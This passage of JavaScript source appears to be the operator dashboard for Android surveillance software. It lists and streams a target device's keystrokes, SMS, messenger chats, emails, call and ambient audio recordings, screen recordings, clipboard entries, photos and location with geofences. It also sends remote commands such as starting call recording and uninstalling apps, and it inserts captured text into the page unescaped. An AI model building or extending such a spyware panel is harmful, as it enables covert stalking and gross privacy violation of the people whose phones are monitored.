            callTimerInterval = setInterval(updateTimerDisplay, 1000);
        }

        sendRemoteCommand("start_call_recording");
        showAlert('🎙️ Call recording started!', 'success');
    }
}

function pauseCallRecording() {
    if (callRecordingStartTime && !callRecordingPaused) {
        callRecordingPaused = true;
        callRecordingPausedTime += Math.floor((Date.now() - callRecordingStartTime) / 1000);
        sendRemoteCommand("pause_call_recording");
        showAlert('⏸️ Call recording paused!', 'info');
    }
}

function stopCallRecording() {
    if (callRecordingStartTime) {
        clearInterval(callTimerInterval);
        callTimerInterval = null;
        callRecordingStartTime = null;
        callRecordingPaused = false;
        callRecordingPausedTime = 0;
        previousSessionDurations = 0;
        warningTriggers.clear();
        updateTimerDisplay();
        sendRemoteCommand("stop_call_recording");
        showAlert('⏹️ Call recording stopped!', 'info');
    }
}

function showAlert(message, type = 'info') {
    const container = document.getElementById("alerts-container");
    const alertDiv = document.createElement("div");
    alertDiv.className = `alert alert-${type}`;
    alertDiv.textContent = message;

    const closeBtn = document.createElement("button");
    closeBtn.textContent = "×";
    closeBtn.style.marginLeft = "16px";
    closeBtn.style.background = "transparent";
    closeBtn.style.border = "none";
    closeBtn.style.fontSize = "20px";
    closeBtn.style.cursor = "pointer";
    closeBtn.onclick = () => container.removeChild(alertDiv);
    alertDiv.appendChild(closeBtn);

    container.appendChild(alertDiv);

    setTimeout(() => {
        if (container.contains(alertDiv)) {
            container.removeChild(alertDiv);
        }
    }, 5000);
}

function initMap() {
    map = L.map("map").setView([23.8103, 90.4125], 13);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "&copy; OpenStreetMap contributors"
    }).addTo(map);
}

function initCharts() {
    const appsCtx = document.getElementById("apps-chart").getContext("2d");
    appsChart = new Chart(appsCtx, {
        type: "doughnut",
        data: {
            labels: [],
            datasets: [{
                data: [],
                backgroundColor: ["#3b82f6", "#10b981", "#f59e0b", "#ef4444", "#8b5cf6", "#ec4899"]
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { position: "bottom" }
            }
        }
    });
}

function initSupabaseRealtime() {
    if (uiState.activeSubscriptions.size > 0) return; // Prevent multiple subscriptions

    const channels = [
        { table: 'locations', page: 'map' },
        { table: 'messenger_messages', page: 'messengers', notify: true },
        { table: 'sms', page: 'sms', notify: true },
        { table: 'photos', page: 'photos' },
        { table: 'screenshots', page: 'screenshots' },
        { table: 'risk_alerts', page: 'risks', notify: true, alert: true },
        { table: 'commands', page: null }
    ];

    channels.forEach(ch => {
        const channel = sbClient
            .channel(`public:${ch.table}`)
            .on('postgres_changes', { event: '*', schema: 'public', table: ch.table }, (payload) => {
                if (payload.new && payload.new.device_id !== selectedDeviceId) return;

                if (payload.eventType === 'INSERT') {
                    allData[ch.table].unshift(payload.new);
                    if (ch.notify) sendNotification(payload.new);
                    if (ch.alert) showAlert(`🚨 ${payload.new.description}`, 'error');
                } else if (payload.eventType === 'UPDATE') {
                    const idx = allData[ch.table].findIndex(item => item.id === payload.new.id);
                    if (idx !== -1) allData[ch.table][idx] = payload.new;
                }

                if (currentPage === ch.page || currentPage === 'dashboard' || currentPage === 'timeline') {
                    updateCurrentPage();
                }
            })
            .subscribe();
        uiState.activeSubscriptions.add(ch.table);
    });
}

async function fetchDevices() {
    try {
        const { data, error } = await sbClient.from('devices').select("*").order('last_seen', { ascending: false });
        if (error) throw error;

        allData.devices = data || [];
        const selector = document.getElementById('device-selector');
        const grid = document.getElementById('device-grid');

        if (allData.devices.length === 0) {
            if (selector) selector.innerHTML = '<option value="">No devices found</option>';
            if (grid) grid.innerHTML = '<p style="color:var(--color-outline);">No devices paired</p>';
            return;
        }

        if (selector) {
            selector.innerHTML = allData.devices.map(d => `
                <option value="${d.id}" ${d.id === selectedDeviceId ? 'selected' : ''}>
                    ${d.device_name}
                </option>
            `).join('');
        }

        if (grid) {
            grid.innerHTML = allData.devices.map(d => `
                <div class="device-thumbnail ${d.id === selectedDeviceId ? 'active' : ''}" onclick="selectDevice('${d.id}')">
                    <span class="device-name">${d.device_name}</span>
                    <span class="device-model">${d.device_model || 'Android'}</span>
                </div>
            `).join('');
        }

        if (!selectedDeviceId && allData.devices.length > 0) {
            selectDevice(allData.devices[0].id);
        }

        updateDeviceStatusBadge();
    } catch (e) {
        console.error('Error fetching devices:', e);
    }
}

function selectDevice(id) {
    selectedDeviceId = id;
    localStorage.setItem('selectedDeviceId', id);
    updateDashboard();
}

function updateDeviceStatusBadge() {
    const device = allData.devices.find(d => d.id === selectedDeviceId);
    const badge = document.getElementById('device-status-badge');
    if (!device || !badge) return;

    const lastSeen = new Date(device.last_seen);
    const now = new Date();
    const diffMins = Math.floor((now - lastSeen) / 60000);

    if (diffMins < 5) {
        badge.textContent = 'ONLINE';
        badge.style.background = 'var(--color-success)';
        badge.style.color = 'white';
    } else {
        badge.textContent = 'OFFLINE';
        badge.style.background = 'var(--color-outline)';
        badge.style.color = 'white';
    }
}

async function fetchData() {
    if (!selectedDeviceId) {
        await fetchDevices();
        if (!selectedDeviceId) return;
    }

    if (uiState.isDataFetching) return;
    uiState.isDataFetching = true;

    const tables = [
        "locations", "call_logs", "sms", "messenger_messages", "web_history",
        "app_usage", "photos", "screenshots", "keystrokes", "clipboard_entries",
        "contacts", "device_info", "network_info", "sim_changes", "commands",
        "geofences", "ambient_recordings", "screen_recordings", "risk_alerts",
        "call_recordings", "email_entries", "app_screen_context", "installed_apps",
        "wifi_history", "calendar_events", "app_traffic"
    ];

    try {
        const fetchPromises = tables.map(async (table) => {
            try {
                let orderCol = "recorded_at";
                if (table === "geofences") orderCol = "id";
                if (table === "commands") orderCol = "created_at";

                const { data, error } = await sbClient
                    .from(table)
                    .select("*")
                    .eq('device_id', selectedDeviceId)
                    .order(orderCol, { ascending: false })
                    .limit(table === "locations" ? 100 : 300);

                if (error) {
                    if (error.message.includes('JWT') || error.code === 'PGRST301') {
                        await checkAuth(); // Trigger silent recovery
                    }
                    throw error;
                }

                if (data) allData[table] = data;
            } catch (e) {
                console.warn(`Recoverable error fetching ${table}:`, e.message);
            }
        });

        await Promise.all(fetchPromises);
        updateCurrentPage();
    } finally {
        uiState.isDataFetching = false;
    }
}

function filterDataByDate(data) {
    return data.filter(item => {
        const dateStr = item.recorded_at || item.last_seen || item.created_at;
        if (!dateStr) return true;
        const itemDate = new Date(dateStr);
        if (startDate && itemDate < startDate) return false;
        if (endDate && itemDate > endDate) return false;
        return true;
    });
}

function searchData(data, fields) {
    if (!searchQuery) return data;
    return data.filter(item => {
        return fields.some(field => {
            const value = item[field];
            return value && value.toString().toLowerCase().includes(searchQuery);
        });
    });
}

function formatDuration(seconds) {
    if (!seconds || seconds === 0) return "-";
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}m ${secs}s`;
}

function formatBytes(bytes) {
    if (!bytes || bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

async function sendRemoteCommand(command, payload = null) {
    try {
        if (!selectedDeviceId) {
            showAlert('⚠️ No devices connected!', 'warning');
            return;
        }

        const insertObj = {
            device_id: selectedDeviceId,
            command: command,
            status: 'pending',
            created_at: new Date().toISOString()
        };
        if (payload) {
            insertObj.payload = payload;
        }
        const { error } = await sbClient.from('commands').insert(insertObj);

        if (error) {
            showAlert('❌ Error sending command: ' + error.message, 'error');
            return;
        }

        showAlert(`✅ Command "${command}" sent successfully!`, 'success');
    } catch (e) {
        console.error('Send command error:', e);
        showAlert('❌ Error sending command!', 'error');
    }
}

function addGeofence() {
    const nameInput = document.getElementById('geofence-name');
    const radiusInput = document.getElementById('geofence-radius');
    const name = nameInput.value.trim();
    const radius = parseFloat(radiusInput.value);

    if (!name || isNaN(radius)) {
        showAlert('Please enter a valid name and radius', 'warning');
        return;
    }

    const center = map.getCenter();
    const geofence = {
        id: Date.now(),
        name,
        latitude: center.lat,
        longitude: center.lng,
        radius: radius
    };

    geofences.push(geofence);
    renderGeofences();
    renderGeofenceOnMap(geofence);

    nameInput.value = '';
    radiusInput.value = '100';
}

function deleteGeofence(id) {
    geofences = geofences.filter(g => g.id !== id);
    renderGeofences();
    updateMap();
}

function renderGeofences() {
    const container = document.getElementById('geofences-list');
    if (!container) return;
    container.innerHTML = geofences.map(g => `
        <div class="geofence-item">
            <span>${g.name} (${g.radius}m)</span>
            <button class="delete-btn" onclick="deleteGeofence(${g.id})">Delete</button>
        </div>
    `).join('');
}

function renderGeofenceOnMap(geofence) {
    const circle = L.circle([geofence.latitude, geofence.longitude], {
        color: '#ef4444',
        fillColor: '#ef4444',
        fillOpacity: 0.2,
        radius: geofence.radius
    }).addTo(map);
    circle.bindPopup(`Geofence: ${geofence.name}`);
    geofenceCircles.push(circle);
}

async function updateDashboard() {
    await fetchDevices();
    await fetchData();
    updateCurrentPage();
}

function updateCurrentPage() {
    switch (currentPage) {
        case 'dashboard':
            updateStats();
            updateCharts();
            updateRecentActivity();
            break;
        case 'map':
            updateMap();
            renderGeofences();
            break;
        case 'calls':
            updateCallsTable();
            break;
        case 'sms':
            updateSmsTable();
            break;
        case 'messengers':
            updateMessengersTable();
            break;
        case 'web':
            updateWebTable();
            break;
        case 'apps':
            updateAppsTable();
            break;
        case 'photos':
            updatePhotosGrid();
            break;
        case 'screenshots':
            updateScreenshotsGrid();
            break;
        case 'keystrokes':
            updateKeystrokesTable();
            break;
        case 'clipboard':
            updateClipboardTable();
            break;
        case 'contacts':
            updateContactsTable();
            break;
        case 'call-recordings':
            updateCallRecordingsTable();
            break;
        case 'emails':
            updateEmailsTable();
            break;
        case 'ambient':
            updateAmbientTable();
            break;
        case 'screen-record':
            updateScreenRecordTable();
            break;
        case 'risks':
            updateRisksTable();
            break;
        case 'device':
            updateDeviceInfo();
            break;
        case 'network':
            updateNetworkTable();
            break;
        case 'sim':
            updateSimTable();
            break;
        case 'app-context':
            updateAppContextTimeline();
            break;
        case 'installed-apps':
            updateInstalledAppsTable();
            break;
        case 'timeline':
            updateGlobalTimeline();
            break;
        case 'keyword-alerts':
            updateKeywordAlertsTable();
            break;
        case 'app-traffic':
            updateAppTrafficTable();
            break;
    }
}

function updateGlobalTimeline() {
    const container = document.getElementById("behavior-timeline");
    const timelineData = [];

    allData.call_logs.forEach(c => timelineData.push({
        type: '📞 Call',
        title: `${c.call_type === 'incoming' ? 'Incoming Call' : 'Outgoing Call'}`,
        body: `Number: ${c.phone_number} | Duration: ${formatDuration(c.duration_seconds)}`,
        time: c.call_timestamp || c.recorded_at,
        icon: '📞'
    }));

    allData.sms.forEach(s => timelineData.push({
        type: '💬 SMS',
        title: `${s.message_type === 'received' ? 'Received SMS' : 'Sent SMS'}`,
        body: `Number: ${s.phone_number} | Message: ${s.content}`,
        time: s.sms_timestamp || s.recorded_at,
        icon: '💬'
    }));

    allData.messenger_messages.forEach(m => timelineData.push({
        type: '📲 Chat',
        title: `${m.messenger_type.toUpperCase()} Message`,
        body: `From: ${m.contact_name} | Text: ${m.content}`,
        time: m.message_timestamp || m.recorded_at,
        icon: '📲'
    }));

    allData.locations.slice(0, 50).forEach(l => timelineData.push({
        type: '📍 Location',
        title: 'Device Movement',
        body: `Lat: ${l.latitude.toFixed(4)}, Lng: ${l.longitude.toFixed(4)} | Battery: ${l.battery_level}%`,
        time: l.recorded_at,
        icon: '📍'
    }));

    allData.photos.slice(0, 10).forEach(p => timelineData.push({
        type: '📷 Photo Capture',
        title: 'New Photo',
        body: `<img src="${p.photo_url}" style="width:100px; border-radius:8px; margin-top:8px;">`,
        time: p.recorded_at,
        icon: '📷'
    }));

    timelineData.sort((a, b) => new Date(b.time) - new Date(a.time));

    if (timelineData.length === 0) {
        container.innerHTML = '<p style="text-align:center; padding:40px; color:#64748b;">No behavior data to display yet.</p>';
        return;
    }

    container.innerHTML = timelineData.map(item => `
        <div class="timeline-item">
            <div class="timeline-icon">${item.icon}</div>
            <div class="timeline-content">
                <div class="timeline-header">
                    <span class="timeline-app-name">${item.title}</span>
                    <span class="timeline-time">${new Date(item.time).toLocaleString()}</span>
                </div>
                <div class="timeline-body">
                    ${item.body}
                </div>
            </div>
        </div>
    `).join('');
}

function updateKeywordAlertsTable() {
    const keywords = filterDataByDate(allData.risk_alerts || []).filter(a => a.alert_type === 'keyword_detected');
    const tbody = document.getElementById("keyword-alerts-table");

    if (keywords.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:40px; color:#64748b;">No keyword alerts yet</td></tr>';
        return;
    }

    tbody.innerHTML = keywords.map(alert => {
        const keywordMatch = alert.description.replace('Monitored keyword detected: ', '');
        return `
            <tr>
                <td><span style="color:var(--color-error); font-weight:bold;">${keywordMatch}</span></td>
                <td>${alert.source}</td>
                <td style="max-width:400px; word-break:break-all;">${alert.content}</td>
                <td>${new Date(alert.recorded_at).toLocaleString()}</td>
            </tr>
        `;
    }).join('');
}

function updateInstalledAppsTable() {
    let apps = filterDataByDate(allData.installed_apps || []);
    const tbody = document.getElementById("installed-apps-table");
    if (apps.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:40px; color:#64748b;">No apps listed yet.</td></tr>';
        return;
    }
    tbody.innerHTML = apps.map(app => `
        <tr>
            <td><strong>${app.app_name}</strong></td>
            <td>${app.package_name}</td>
            <td>${app.version_name || "-"}</td>
            <td><button onclick="sendRemoteCommand('uninstall_app', '${app.package_name}')" style="background:var(--color-danger); color:white; border:none; padding:6px 12px; border-radius:6px; cursor:pointer;">Uninstall</button></td>
        </tr>
    `).join('');
}

function updateAppTrafficTable() {
    let traffic = filterDataByDate(allData.app_traffic || []);
    const tbody = document.getElementById("app-traffic-table");
    if (!tbody) return;

    if (traffic.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px; color:#64748b;">No app traffic data yet</td></tr>';
        return;
    }

    tbody.innerHTML = traffic.map(t => `
        <tr>
            <td><strong>${t.app_name}</strong></td>
            <td>${t.package_name}</td>
            <td>${formatBytes(t.bytes_sent)}</td>
            <td>${formatBytes(t.bytes_received)}</td>
            <td style="font-weight:bold; color:var(--color-primary);">${formatBytes(t.bytes_sent + t.bytes_received)}</td>
            <td>${new Date(t.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateStats() {
    const locations = filterDataByDate(allData.locations || []);
    const calls = filterDataByDate(allData.call_logs || []);
    const sms = filterDataByDate(allData.sms || []);

    document.getElementById("stat-locations").textContent = locations.length;
    document.getElementById("stat-calls").textContent = calls.length;
    document.getElementById("stat-sms").textContent = sms.length;

    const latestLocation = locations[0];
    document.getElementById("stat-battery").textContent = latestLocation ? `${latestLocation.battery_level}%` : "-";
}

function updateRecentActivity() {
    const container = document.getElementById("recent-activity");
    const activities = [];

    allData.call_logs.slice(0, 3).forEach(c => activities.push({ type: '📞 Call', text: `${c.call_type} from ${c.phone_number}`, time: c.call_timestamp || c.recorded_at }));
    allData.sms.slice(0, 3).forEach(s => activities.push({ type: '💬 SMS', text: `${s.message_type}: ${s.content.substring(0, 30)}...`, time: s.sms_timestamp || s.recorded_at }));
    allData.risk_alerts.slice(0, 3).forEach(a => activities.push({ type: '⚠️ Alert', text: a.description, time: a.recorded_at }));

    activities.sort((a, b) => new Date(b.time) - new Date(a.time));

    if (activities.length === 0) {
        container.innerHTML = '<p style="padding: 20px; color: #64748b; text-align: center;">No recent activity</p>';
        return;
    }

    container.innerHTML = activities.slice(0, 8).map(act => `
        <div style="padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; justify-content: space-between; align-items: center;">
            <div>
                <strong style="color: var(--color-primary);">${act.type}</strong>
                <p style="margin: 4px 0 0 0; font-size: 14px;">${act.text}</p>
            </div>
            <span style="font-size: 12px; color: #94a3b8;">${new Date(act.time).toLocaleTimeString()}</span>
        </div>
    `).join('');
}

function updateRisksTable() {
    let risks = filterDataByDate(allData.risk_alerts);
    const tbody = document.getElementById("risks-table");
    if (risks.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px; color:#64748b;">No risk alerts yet</td></tr>';
        return;
    }
    tbody.innerHTML = risks.map(alert => `
        <tr>
            <td><span class="badge" style="background:var(--color-danger); color:white; padding: 4px 8px; border-radius: 4px;">${alert.alert_type}</span></td>
            <td>${alert.description}</td>
            <td>${alert.source}</td>
            <td>${alert.content || '-'}</td>
            <td>${new Date(alert.recorded_at).toLocaleString()}</td>
            <td><button onclick="deleteAlert('${alert.id}')" style="background:none; border:none; color:var(--color-danger); cursor:pointer;">🗑️ Clear</button></td>
        </tr>
    `).join('');
}

function updateDeviceInfo() {
    const container = document.getElementById("device-info-card");
    const info = allData.device_info[0];
    if (!info) {
        container.innerHTML = '<div style="text-align:center; padding:40px;">No device info available</div>';
        return;
    }
    container.innerHTML = `
        <div class="info-grid">
            <div class="info-item"><h4>Model</h4><p>${info.model}</p></div>
            <div class="info-item"><h4>Android</h4><p>${info.android_version}</p></div>
            <div class="info-item"><h4>RAM</h4><p>${formatBytes(info.ram_available)} / ${formatBytes(info.ram_total)}</p></div>
            <div class="info-item"><h4>Storage</h4><p>${formatBytes(info.storage_available)} / ${formatBytes(info.storage_total)}</p></div>
            <div class="info-item"><h4>Updated</h4><p>${new Date(info.recorded_at).toLocaleString()}</p></div>
        </div>
    `;
}

function updateNetworkTable() {
    let networkInfo = filterDataByDate(allData.network_info);
    const tbody = document.getElementById("network-table");
    if (networkInfo.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No network info</td></tr>';
        return;
    }
    tbody.innerHTML = networkInfo.map(info => `
        <tr>
            <td>${info.wifi_ssid || "-"}</td>
            <td>${info.network_type || "-"}</td>
            <td>${info.signal_strength != null ? info.signal_strength + "%" : "-"}</td>
            <td>${info.cell_id || "-"}/${info.location_area_code || "-"}</td>
            <td>${info.mobile_country_code || "-"}/${info.mobile_network_code || "-"}</td>
            <td>${new Date(info.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateSimTable() {
    let simChanges = filterDataByDate(allData.sim_changes);
    const tbody = document.getElementById("sim-table");
    tbody.innerHTML = simChanges.map(sim => `
        <tr><td>${sim.old_imsi || "-"}</td><td>${sim.new_imsi || "-"}</td><td>${new Date(sim.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateAppContextTimeline() {
    const container = document.getElementById("app-context-timeline");
    container.innerHTML = allData.app_screen_context.map(ctx => `
        <div class="timeline-item">
            <div class="timeline-content">
                <div class="timeline-header"><strong>${ctx.app_name}</strong><span>${new Date(ctx.recorded_at).toLocaleString()}</span></div>
                <div class="timeline-body">${ctx.screen_text}</div>
            </div>
        </div>
    `).join('');
}

function updateCharts() {
    const apps = filterDataByDate(allData.app_usage || []);
    const appUsageMap = {};
    apps.forEach(app => {
        const name = app.app_name || app.package_name;
        appUsageMap[name] = (appUsageMap[name] || 0) + app.usage_time_seconds;
    });

    const sortedApps = Object.entries(appUsageMap).sort((a, b) => b[1] - a[1]).slice(0, 6);
    appsChart.data.labels = sortedApps.map(([name]) => name);
    appsChart.data.datasets[0].data = sortedApps.map(([, time]) => Math.round(time / 60));
    appsChart.update();
}

function updateMap() {
    if (!map) return;
    const locations = filterDataByDate(allData.locations || []);
    if (locations.length === 0) return;

    map.eachLayer((layer) => { if (layer instanceof L.Marker || layer instanceof L.Polyline) map.removeLayer(layer); });

    const latlngs = locations.map(l => [l.latitude, l.longitude]);
    if (latlngs.length > 1) L.polyline(latlngs, { color: 'var(--color-primary)', weight: 3 }).addTo(map);

    const latest = locations[0];
    L.marker([latest.latitude, latest.longitude]).addTo(map).bindPopup(`<b>Current</b><br>${new Date(latest.recorded_at).toLocaleString()}`).openPopup();
    map.setView([latest.latitude, latest.longitude], 15);
}

function updateCallsTable() {
    const tbody = document.getElementById("calls-table");
    tbody.innerHTML = allData.call_logs.map(c => `
        <tr><td>${c.contact_name || "Unknown"}</td><td>${c.phone_number}</td><td><span class="badge ${c.call_type}">${t(c.call_type)}</span></td><td>${formatDuration(c.duration_seconds)}</td><td>${new Date(c.call_timestamp).toLocaleString()}</td></tr>
    `).join('');
}

function updateSmsTable() {
    const tbody = document.getElementById("sms-table");
    tbody.innerHTML = allData.sms.map(s => `
        <tr><td>${s.contact_name || "Unknown"}</td><td>${s.phone_number}</td><td><span class="badge ${s.message_type}">${t(s.message_type)}</span></td><td class="content-cell">${s.content}</td><td>${new Date(s.sms_timestamp).toLocaleString()}</td></tr>
    `).join('');
}

function updateMessengersTable() {
    const tbody = document.getElementById("messengers-table");
    tbody.innerHTML = allData.messenger_messages.map(m => `
        <tr><td>${m.messenger_type}</td><td>${m.contact_name || "Unknown"}</td><td><span class="badge ${m.message_type}">${t(m.message_type)}</span></td><td class="content-cell">${m.content}</td><td>${new Date(m.message_timestamp).toLocaleString()}</td></tr>
    `).join('');
}

function updateWebTable() {
    const tbody = document.getElementById("web-table");
    tbody.innerHTML = allData.web_history.map(h => `
        <tr><td>${h.title || "No Title"}</td><td>${h.url}</td><td>${new Date(h.entry_time).toLocaleTimeString()}</td><td>${new Date(h.exit_time).toLocaleTimeString()}</td><td>${formatDuration(h.duration_seconds)}</td><td>${h.browsing_mode}</td><td>${new Date(h.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateAppsTable() {
    const tbody = document.getElementById("apps-table");
    tbody.innerHTML = allData.app_usage.map(a => `
        <tr><td><strong>${a.app_name}</strong></td><td>${a.package_name}</td><td>${formatDuration(a.usage_time_seconds)}</td><td>${new Date(a.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updatePhotosGrid() {
    const container = document.getElementById("photos-grid");
    container.innerHTML = allData.photos.map(p => `
        <div class="media-card" onclick="window.open('${p.photo_url}', '_blank')"><img src="${p.photo_url}" loading="lazy"><div class="media-info"><span>${new Date(p.recorded_at).toLocaleString()}</span></div></div>
    `).join('');
}

function updateScreenshotsGrid() {
    const container = document.getElementById("screenshots-grid");
    container.innerHTML = allData.screenshots.map(s => `
        <div class="media-card" onclick="window.open('${s.screenshot_url}', '_blank')"><img src="${s.screenshot_url}" loading="lazy"><div class="media-info"><span>${new Date(s.recorded_at).toLocaleString()}</span></div></div>
    `).join('');
}

function updateKeystrokesTable() {
    const tbody = document.getElementById("keystrokes-table");
    tbody.innerHTML = allData.keystrokes.map(k => `
        <tr><td>${k.app_name || "Unknown"}</td><td style="word-break:break-all;">${k.text_content}</td><td>${new Date(k.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateClipboardTable() {
    const tbody = document.getElementById("clipboard-table");
    tbody.innerHTML = allData.clipboard_entries.map(c => `
        <tr><td style="word-break:break-all;">${c.content}</td><td>${new Date(c.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateContactsTable() {
    const tbody = document.getElementById("contacts-table");
    tbody.innerHTML = allData.contacts.map(c => `
        <tr><td><strong>${c.display_name}</strong></td><td>${c.phone_numbers?.join(', ') || "-"}</td><td>${c.emails?.join(', ') || "-"}</td><td>${new Date(c.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateCallRecordingsTable() {
    const tbody = document.getElementById("call-recordings-table");
    tbody.innerHTML = allData.call_recordings.map(r => `
        <tr><td>${r.contact_name || "Unknown"}</td><td>${r.phone_number || "-"}</td><td><span class="badge" style="background:var(--color-primary); color:white; padding: 2px 6px; border-radius: 4px;">${t(r.call_type || 'unknown')}</span></td><td>${formatDuration(r.duration_seconds)}</td><td><audio controls src="${r.file_url}" style="height:32px;"></audio></td><td>${new Date(r.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateEmailsTable() {
    const tbody = document.getElementById("emails-table");
    tbody.innerHTML = allData.email_entries.map(e => `
        <tr><td>${e.from_address}</td><td>${e.to_addresses?.join(', ') || "-"}</td><td>${e.subject || "No Subject"}</td><td style="max-width:300px; overflow:hidden;">${e.body || "-"}</td><td>${new Date(e.email_timestamp).toLocaleString()}</td></tr>
    `).join('');
}

function updateAmbientTable() {
    const tbody = document.getElementById("ambient-table");
    tbody.innerHTML = allData.ambient_recordings.map(r => `
        <tr><td><audio controls src="${r.file_url}" style="height:32px;"></audio></td><td>${formatDuration(r.duration_seconds)}</td><td>${new Date(r.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function updateScreenRecordTable() {
    const tbody = document.getElementById("screen-record-table");
    tbody.innerHTML = allData.screen_recordings.map(r => `
        <tr><td><video controls src="${r.file_url}" style="height:100px; border-radius: 8px;"></video></td><td>${formatDuration(r.duration_seconds)}</td><td>${new Date(r.recorded_at).toLocaleString()}</td></tr>
    `).join('');
}

function exportToCSV() { /* Basic Implementation */ }
function exportToJSON() { /* Basic Implementation */ }

function startLiveRefresh() { if (!liveRefreshInterval) liveRefreshInterval = setInterval(async () => { await updateDashboard(); }, 2000); }
function stopLiveRefresh() { if (liveRefreshInterval) { clearInterval(liveRefreshInterval); liveRefreshInterval = null; } }
